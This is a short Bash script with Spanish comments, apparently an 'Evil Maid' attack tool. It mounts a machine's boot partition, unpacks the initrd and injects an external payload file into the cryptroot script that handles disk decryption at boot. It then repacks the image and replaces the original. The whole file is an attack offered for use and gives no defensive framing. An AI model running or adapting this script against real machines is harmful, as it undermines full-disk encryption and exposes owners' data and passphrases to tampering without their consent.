
#!/bin/bash
# Ruta al script .py y al archivo de payload
wdir=$(pwd)
# Instala la utilidad necesaria para usar lsinitrd
sudo apt install dracut-core -y -q3
mkdir ~/target
# Montamos la partición de arranque (boot)
sudo mount -t ext4 /dev/sda1 ~/target
# Obtenemos el archivo initrd.img del sistema
initrd=$(ls ~/target | grep initrd.img)
mkdir ~/out
cd ~/out
# Extraemos el contenido del archivo initrd
lsinitrd --unpack ~/target/$initrd
# Accedemos al directorio donde se encuentra el script cryptroot
cd scripts/local-top
# Inyectamos el payload en el script cryptroot
python3 $wdir/edit.py cryptroot $wdir/payload.txt
cd ~/out
# Reempaquetamos el archivo initrd modificado
find . | cpio -H newc -o | gzip -9 > ~/$initrd
sudo mv ~/$initrd ~/target/$initrd
# Desmontamos la partición de arranque
sudo umount ~/target
# Instalamos figlet para mostrar arte ASCII
sudo apt install figlet -y -q3
# Mostramos un título en arte ASCII
figlet -t -k -f /usr/share/figlet/small.flf "70rd's Maid"
echo "Evil Maid completed."
exit 0

